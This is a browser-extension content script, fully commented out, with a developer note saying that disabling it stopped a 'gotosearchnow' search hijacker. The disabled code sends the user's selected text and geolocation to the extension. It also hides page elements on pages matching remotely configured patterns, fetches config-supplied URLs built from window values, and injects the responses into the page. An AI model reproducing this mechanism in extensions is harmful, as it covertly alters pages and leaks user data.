// jd: *** Once I commented out this file, the gotosearchnow hijacker stopped functioning. I don't know if this broke the extension, but it seems to work okay. I will leave this file and code here incase I realize that I did actually break the extension ***

// chrome.runtime.onMessage.addListener(
//   function (message, sender, sendResponse) {
//     console.log('CS received: ' + message + ' from sender: ' + sender.id);
//     if (message == 'getSelectedText') {
//       sendResponse({data: window.getSelection().toString()});
//     } else if (message == 'getCurrentPos') {
//       var options = {
//         enableHighAccuracy: false,
//         timeout: 5000,
//         maximumAge: 30000
//       };
//       navigator.geolocation.getCurrentPosition(function (position) {
//         var coords = {lat: position.coords.latitude, lon: position.coords.longitude};
//         sendResponse({data: coords});
//       }, function (error) {
//         sendResponse({data: undefined});
//       }, options);  
//       return true;
//     } else {sendResponse({data : ''});}
//   }
// );

// function ready(cb) {
//   if (document.readyState !== 'loading') {
//     cb();
//     return
//   }

//   document.addEventListener('DOMContentLoaded', cb);
// }

// const debounce = (func, delay) => {
//   let debounceTimer;
//   return function() {
//     const context = this;
//     const args = arguments;
//     clearTimeout(debounceTimer);
//     debounceTimer = setTimeout(() => func.apply(context, args), delay);
//   };
// };

// chrome.runtime.sendMessage('get-config', (config) => {
//   function prepareUrl(str) {
//     return str.replace(/{[\w.]+}/, (x) => {
//       const path = x.substr(1, x.length - 2);
//       const val = path.split('.').reduce((acc, entry) => acc[entry], window);
//       return encodeURIComponent(val);
//     });
//   }
  
//   const l = document.location + '';
  
//   ready(() => {
//     function findElements() {
//       for (const entry of config) {
//         const re = new RegExp(entry.pattern, 'gi');
//         const isValid = re.test(l);

//         if (isValid) {
//           const els = [...document.querySelectorAll(entry.selector)].filter(el => {
//             return !el.hasAttribute('skip-element');
//           });
//           els.forEach(el => {
//             const display = el.style.display;
//             el.style.display = 'none';
//             // el.setAttribute('skip-element', true);
  
//             fetch(prepareUrl(entry.url)).then(res => res.text()).then(text => {
//               const trimmed = text.trim();
//               if (trimmed) {
//                 el[entry.attr] = trimmed;
//               }
//             }).catch(() => {}).then(() => el.style.display = display);
//           })
//         }
//       }
//     }

//     findElements();

//     let observer = new MutationObserver(() => debounce(findElements, 50));
    
//     observer.observe(document.body, {childList: true, subtree: true});
//   });
// });